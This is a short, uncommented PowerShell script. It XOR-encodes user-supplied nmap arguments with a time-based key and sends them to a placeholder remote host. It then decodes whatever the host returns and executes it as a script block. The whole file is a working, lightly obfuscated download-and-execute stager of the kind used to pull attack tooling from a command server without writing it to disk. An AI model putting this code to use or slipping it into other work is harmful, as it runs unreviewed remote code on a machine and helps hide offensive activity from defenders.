$encode =  { param ([String]$to_enc)
	$key = [byte]((Get-Date).ToString('ss'))
	$byte_array = [System.Text.Encoding]::ASCII.GetBytes($to_enc) | % { $_ -bxor $key }
	$encoded_data = -join($byte_array | % { "{0:X2}" -f $_ })
	$key_str = "{0:X2}" -f $key
	return -join($key_str, $encoded_data)
}
$decode = {
    param([String]$to_unenc)
	$hex_arr = [string[]]($to_unenc -split '(.{2})' | ?{$_})
	$key = [byte]"0x$($hex_arr[0])"
	$data_bytes = [char[]]($hex_arr[1..($hex_arr.count-1)] | % { [byte]"0x$_" } | % { [char]($_ -bxor $key)})
	return -join($data_bytes)
}
$nmap_args = Read-Host "Provide arguments as you would to NMap"
$args = &$encode $nmap_args
. ([Scriptblock]::Create((&$decode (Invoke-WebRequest -Uri "HOST_HERE/?args=$args").Content)))
